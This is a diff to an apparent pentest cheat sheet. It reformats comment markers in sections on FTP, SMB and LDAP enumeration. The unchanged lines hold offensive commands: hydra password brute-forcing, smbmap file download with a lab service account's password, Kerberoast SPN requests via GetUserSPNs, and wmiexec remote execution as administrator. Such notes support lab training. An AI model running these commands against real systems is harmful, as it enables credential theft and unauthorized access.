@@ -49,14 +49,14 @@ hydra -s 21 -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ftp
 
 #### Basic Connection and FTP commands
 ```
-\\Connection
+➤ Connection
 ftp 10.0.0.1 21
 
-\\Upload a file (from the folder where the shell has been started)
+➤ Upload a file (from the folder where the shell has been started)
 binary
 put <filename>
 
-\\Download a file (to the folder where the shell has been started)
+➤ Download a file (to the folder where the shell has been started)
 binary
 get <filename>
 ```
@@ -117,19 +117,19 @@ smbclient -L 10.0.0.1 --options='client min protocol=NT1'
 ```
 smbmap -H 10.0.0.1
 
-// Reculsive enumeration
+➤ Reculsive enumeration
 smbmap -H 10.0.0.1 -R
 
-// Recursive enumeration on a specific folder
+➤ Recursive enumeration on a specific folder
 smbmap -H 10.0.0.1 -R 'Replication\active.htb'
 
-// Authenticated enumeration
+➤ Authenticated enumeration
 smbmap -H 10.0.0.1 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R
 
-// Download a file
+➤ Download a file
 smbmap -H 10.10.0.1 --download '.\Users\SVC_TGS\Desktop\user.txt'
 
-// If error ‘[!] Authentication error on 10.0.0.1’ try with a fake user -u ‘123’
+➤ If error ‘[!] Authentication error on 10.0.0.1’ try with a fake user -u ‘123’
 smbmap -H 10.0.0.1 -R -u ‘123’
 ```
 
@@ -159,24 +159,24 @@ hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ## Port 143
 ## Port 389
 ```
-\\ With the example test.com : DOMAIN = test and DOMAIN2 = com
+➤ With the example test.com : DOMAIN = test and DOMAIN2 = com
 ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 
 ./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
 -----> EX: ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
 
-// Verify if a SPN exist
+➤ Verify if a SPN exist
 ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'password' -b "dc=domain,dc=com" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
 
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
 -----> EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1
 -----> OUTPUT: active/CIFS:445 -> a SPN exist
 
-// Request the token
+➤ Request the token
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP> -request
 -----> EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1 -request
 
-// Wmiexec equivalent to psexec
+➤ Wmiexec equivalent to psexec
 ./wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 -----> EX: ./wmiexec.py domain.com/administrator:password@10.0.0.1
 ```
